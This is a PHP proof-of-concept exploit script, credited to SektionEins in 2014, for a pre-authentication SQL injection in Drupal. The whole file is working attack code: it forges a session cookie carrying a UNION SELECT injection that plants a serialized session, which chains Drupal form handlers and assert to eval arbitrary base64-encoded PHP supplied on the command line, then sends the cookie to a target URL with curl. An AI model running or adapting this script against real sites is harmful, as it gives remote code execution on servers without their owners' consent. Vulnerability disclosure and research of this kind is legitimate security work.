<?php
//    _____      __   __  _             _______
//   / ___/___  / /__/ /_(_)___  ____  / ____(_)___  _____
//   \__ \/ _ \/ //_/ __/ / __ \/ __ \/ __/ / / __ \/ ___/
//  ___/ /  __/ ,< / /_/ / /_/ / / / / /___/ / / / (__  )
// /____/\___/_/|_|\__/_/\____/_/ /_/_____/_/_/ /_/____/
// Poc for Drupal Pre Auth SQL Injection - (c) 2014 SektionEins
//
// created by Stefan Horst <stefan.horst@sektioneins.de>
//        and Stefan Esser <stefan.esser@sektioneins.de>
//·

include 'common.inc';
include 'password.inc';

// set values
$user_id = 0;
$user_name = '';

$code_inject = 'phpinfo();session_destroy();die("");';

$url = isset($argv[1])?$argv[1]:'';
$code = isset($argv[2])?$argv[2]:'';

if ($url == '-h') {
      echo "usage:\n";
      echo $argv[0].' $url [$code|$file]'."\n";
      die();
}

if (empty($url) || strpos($url,'https') === False) {
      echo "please state the cookie url. It works only with https urls.\n";
      die();
}

if (!empty($code)) {
      if (is_file($code)) {
              $code_inject = str_replace('<'.'?','',str_replace('<'.'?php','',str_replace('?'.'>','',file_get_contents($code))));
      } else {
              $code_inject = $code;
      }
}

$code_inject = rtrim($code_inject,';');
$code_inject .= ';session_destroy();die("");';

if (strpos($url, 'www.') === 0) {
      $url = substr($url, 4);
}

$_SESSION= array('a'=>'eval(base64_decode("'.base64_encode($code_inject).'"))','build_info' => array(), 'wrapper_callback' => 'form_execute_handlers', '#Array' => array('array_filter'), 'string' => 'assert');
$_SESSION['build_info']['args'][0] = &$_SESSION['string'];

list( , $session_name) = explode('://', $url, 2);

// use insecure cookie with sql inj.
$cookieName = 'SESS' . substr(hash('sha256', $session_name), 0, 32);
$password = user_hash_password('test');

$session_id = drupal_random_key();
$sec_ssid = drupal_random_key();

$serial = str_replace('}','CURLYCLOSE',str_replace('{','CURLYOPEN',"batch_form_state|".serialize($_SESSION)));
$inject = "UNION SELECT $user_id,'$user_name','$password','','','',null,0,0,0,1,null,'',0,'',null,$user_id,'$session_id','','127.0.0.1',0,0,REPLACE(REPLACE('".$serial."','CURLYCLOSE',CHAR(".ord('}').")),'CURLYOPEN',CHAR(".ord('{').")) -- ";

$cookie = $cookieName.'[test+'.urlencode($inject).']='.$session_id.'; '.$cookieName.'[test]='.$session_id.'; S'.$cookieName.'='.$sec_ssid;

$ch = curl_init($url);

curl_setopt($ch,CURLOPT_HEADER,True);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,True);
curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,False);
curl_setopt($ch,CURLOPT_USERAGENT,'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:34.0) Gecko/20100101 Firefox/34.0');

curl_setopt($ch,CURLOPT_HTTPHEADER,array(
      'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      'Accept-Language: en-US,en;q=0.5'
));

curl_setopt($ch,CURLOPT_COOKIE,$cookie);

$output = curl_exec($ch);

curl_close($ch);

echo $output;